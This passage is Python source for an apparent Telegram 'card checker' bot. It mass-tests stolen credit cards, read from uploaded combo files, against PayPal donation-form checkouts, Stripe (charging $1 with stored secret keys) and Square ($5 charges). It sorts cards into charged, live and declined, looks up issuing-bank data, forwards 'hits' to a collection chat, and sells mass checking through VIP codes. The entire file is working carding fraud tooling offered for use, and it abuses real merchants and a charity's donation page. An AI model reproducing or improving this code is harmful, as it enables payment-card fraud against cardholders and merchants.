        if text_lower == 'true':
            return 'CHARGE 1.0'
        try:
            approve_json = json.loads(text_strip)
            if isinstance(approve_json, dict):
                if approve_json.get('success') is True:
                    data = approve_json.get('data', {})
                    if isinstance(data, dict):
                        order = data.get('order', {})
                        if isinstance(order, dict):
                            order_status = str(order.get('status', '')).upper()
                            if order_status == 'COMPLETED':
                                return 'CHARGE 1.0'
        except:
            pass
        if 'insufficient' in text_lower:
            return 'INSUFFICIENT_FUNDS'
        for pr in PAYPAL_RESPONSES:
            if pr in text_strip.upper():
                if pr == 'ORDER_NOT_APPROVED':
                    return "Payer cannot pay for this transaction."
                return pr
        if len(text_strip) < 100:
            return "PAYER_ACTION_REQUIRED"
        return text_strip[:200]

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return "INVALID_GATEWAY"
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            order_id, err = self._create_order()
            if not order_id:
                return f"Create Order Failed: {err}" if err else "Create Order Failed"
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            confirm_json = {}
            confirm_text = ""
            for auth_token in auth_tokens:
                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}
                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                try:
                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                    confirm_text = confirm_res.text
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            if isinstance(confirm_json, dict):
                if 'details' in confirm_json and len(confirm_json['details']) > 0:
                    detail = confirm_json['details'][0]
                    issue = detail.get('issue', '')
                    description = detail.get('description', '')
                    if issue:
                        if issue == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        if description:
                            return f"{issue}: {description}"
                        return issue
                if 'name' in confirm_json:
                    name = confirm_json.get('name', '')
                    if name in PAYPAL_RESPONSES:
                        msg = confirm_json.get('message', '')
                        if msg:
                            return f"{name}: {msg}"
                        return name
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            if text:
                return self._clean_response(text)
            return "DECLINED"
        except Exception as e:
            return f"Error: {e}"


async def check_card_api(card_full, gateway_url):
    async with api_semaphore:
        try:
            loop = asyncio.get_event_loop()
            def run_check():
                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                return pp_engine.Charge(card_full)
            result_raw = await loop.run_in_executor(None, run_check)
            await asyncio.sleep(0.5)
            result = str(result_raw)
            result_lower = result.lower()
            if result.startswith("CHARGE"):
                return "approved", result_raw
            elif "insufficient" in result_lower:
                return "live", result_raw
            else:
                if result.startswith("Error:"):
                    result = result.replace("Error:", "").strip()
                if result and result != "DECLINED":
                    return "declined", result
                return "declined", "Declined"
        except Exception as e:
            return "declined", f"Error: {e}"


# ==================== Stripe ====================
def check_stripe_sync(card, key_id="1"):
    try:
        if not STRIPE_KEYS:
            return "No Stripe keys"
        key = STRIPE_KEYS.get(str(key_id))
        if not key:
            return f"Key {key_id} not found"
        pk = key.get("pk", "")
        sk = key.get("sk", "")
        if not pk or not sk:
            return f"Key {key_id}: Invalid keys"
        parts = card.strip().split("|")
        if len(parts) != 4:
            return "INVALID FORMAT"
        cc_number, exp_month, exp_year, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(exp_year) == 2:
            exp_year = "20" + exp_year
        session = requests.Session()
        session.verify = False
        headers = {"Authorization": f"Bearer {pk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"card[number]": cc_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc}
        r = session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, timeout=30)
        if r.status_code != 200:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
        token_id = r.json()["id"]
        headers = {"Authorization": f"Bearer {sk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"amount": "100", "currency": "usd", "source": token_id, "description": "WAFA"}
        r = session.post("https://api.stripe.com/v1/charges", headers=headers, data=data, timeout=30)
        if r.status_code == 200:
            status = r.json().get("status", "")
            if status == "succeeded":
                return f"Key {key_id} | CHARGE $1"
            elif status in ["pending", "processing"]:
                return f"Key {key_id} | LIVE"
            else:
                return f"Key {key_id} | {status}"
        else:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
    except Exception as e:
        return f"Key {key_id} | Error: {str(e)[:50]}"
    finally:
        try:
            session.close()
        except:
            pass


# ==================== Hit Sender ====================
async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
    hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
- - - - - - - - - - - - - - - - - - - - - -
⚡ 𝐔𝐬𝐞𝐫: @{username}
⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1"""
    try:
        await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
    except:
        pass


# ==================== Square File Processing ====================
async def process_square_file(file_path, chat_id, context, gateway_name="Square 5$", username="Unknown"):
    global hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Square 5$ Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards == 0:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
            return
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            result_dict = await loop.run_in_executor(None, check_square_sync, card_full)
            taken = round(time.time() - start_time, 2)
            status = result_dict.get('status', 'ERROR')
            message = result_dict.get('message', '')
            if status == 'CHARGE':
                approved += 1
                text = await format_square_response(card_full, result_dict, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge 5$", message, gateway_name)
            elif status == 'APPROVED':
                live += 1
                text = await format_square_response(card_full, result_dict, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 " + message, message, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{status}: {message[:60]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== PayPal File Processing ====================
async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
    global gateway_index, hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards == 0:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
            return
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            gateway_num = 0
            gateway_url = None
            if GATEWAYS:
                gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
            status, response = await check_card_api(card_full, gateway_url)
            taken = round(time.time() - start_time, 2)
            if status == "approved":
                approved += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
            elif status == "live":
                live += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", response, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔗 𝐆𝐚𝐭𝐞 #{gateway_num if gateway_num else 'N/A'}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Stripe File Processing ====================
async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
    global hit_counter
    if not STRIPE_KEYS:
        await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Stripe Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            keys_list = list(STRIPE_KEYS.keys())
            total_keys = len(keys_list)
            if total_keys == 0:
                await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
                return
            key_id = keys_list[(card_counter - 1) % total_keys]
            result = await loop.run_in_executor(None, check_stripe_sync, card_full, key_id)
            taken = round(time.time() - start_time, 2)
            result_upper = str(result).upper()
            if "CHARGE" in result_upper:
                approved += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge", result, gateway_name)
            elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                live += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔑 𝐊𝐞𝐲 #{key_id}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{result[:80]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Formatters ====================
async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        status_emoji = "🔥"
        status_text = "Charge"
    elif status == "live":
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
        user_status = premium_emoji(user_status)
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    gateway_info = ""
    if gateway_url and gateway_num:
        gateway_info = f"\n🔗 𝐆𝐚𝐭𝐞 #{gateway_num}: <code>{gateway_url}</code>"
    return premium_emoji(f"""💳 #PayPal [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status}){gateway_info}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        status_emoji = "🔥"
        status_text = "Charge $1"
    elif "INSUFFICIENT" in result_upper:
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    elif "LIVE" in result_upper:
        status_emoji = "💵"
        status_text = "Live"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""💳 #Stripe [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{result}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


async def format_square_response(card_full, result_dict, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    status = result_dict.get('status', 'ERROR')
    message = result_dict.get('message', '')
    if status == "CHARGE":
        status_emoji = "🔥"
        status_text = "Charge 5$"
    elif status == "APPROVED":
        status_emoji = "💵"
        status_text = message or "Approved"
    elif status == "DECLINE":
        status_emoji = "❌"
        status_text = "Declined"
    else:
        status_emoji = "⚠️"
        status_text = "Error"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    resp_display = f"{status}: {message}" if message else status
    return premium_emoji(f"""💳 #Square [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{resp_display[:100]}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


# ==================== /start ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    username = update.effective_user.username or "No Username"
    keyboard = [
        [
            InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds", style="primary"),
            InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds", style="success"),
        ],
        [
            InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds", style="danger"),
        ],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel", style="primary"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel", style="success"),
        ],
        [
            InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel", style="primary"),
            InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel", style="success"),
        ],
    ]
    await update.message.reply_text(
        premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==================== Callbacks ====================
async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /sq [card] - Square 5$ single\n• /stop - Stop mass\n• /code [key] - Activate VIP"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /pp [card] - PayPal single\n• /sq [card] - Square 5$ single"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        await query.answer("Admin only!", show_alert=True)
        return
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /banned_list - Show banned users\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal", style="primary")],
        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe", style="primary")],
        [InlineKeyboardButton("💳 Square 5$", callback_data="check_square", style="success")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")],
    ]
    await query.edit_message_text(
        premium_emoji("💳 Choose check type:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")


async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")


async def check_square_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/sq [card]</code>\n\n⚠️ Square charges 5$ per card."), parse_mode="HTML")


async def clean_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("🧹 Send cards file to clean:\nFormat: <code>number|mm|yy|cvv</code>"), parse_mode="HTML")


async def parts_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("📁 Send file then use:\n<code>/parts [number]</code>\n\nExample: <code>/parts 4</code>"), parse_mode="HTML")


async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username or "No Username"
    keyboard = [
        [
            InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds", style="primary"),
            InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds", style="success"),
        ],
        [
            InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds", style="danger"),
        ],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel", style="primary"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel", style="success"),
        ],
        [
            InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel", style="primary"),
            InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel", style="success"),
        ],
    ]
    await query.edit_message_text(
        premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==================== /cmds ====================
async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    commands_text = """👑 ADMIN:
• /add [url] - Add PayPal gateway
• /rmadd [num] - Remove gateway
• /show_gateways - Show gateways
• /ban_user [id] - Ban user
• /unban_user [id] - Unban user
• /banned_list - Show banned users
• /prm [id] [days] - Add VIP
• /rmprm [id] - Remove VIP
• /wafa [days] [max] - Generate keys
• /show_users - Show users
• /try [id] [msg] - DM user
• /SENT [msg] - Broadcast
• /addkey [pk] [sk] - Add Stripe key
• /rmkey [id] - Remove Stripe key

💎 VIP:
• Upload combo file - Mass checking (Max 2000)
• /st [card] - Stripe single
• /pp [card] - PayPal single
• /sq [card] - Square 5$ single

🤖 FREE:
• /start - Start
• /cmds - Commands
• /pp [card] - PayPal single
• /sq [card] - Square 5$ single
• /stop - Stop mass
• /code [key] - Activate VIP"""
    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")


# ==================== /pp ====================
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter, gateway_index
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
        return
    card_full = " ".join(context.args)
    gateway_num = 0
    gateway_url = None
    gateway_name = "PayPal"
    if GATEWAYS:
        gateway_num = (gateway_index % len(GATEWAYS)) + 1
        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
        gateway_index += 1
    status, response = await check_card_api(card_full, gateway_url)
    taken = round(time.time() - last_check_time.get(user_id, time.time()), 2)
    text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Single")
    await update.message.reply_text(text, parse_mode="HTML")
    if status == "approved" or status == "live":
        hit_counter += 1
        user = update.effective_user
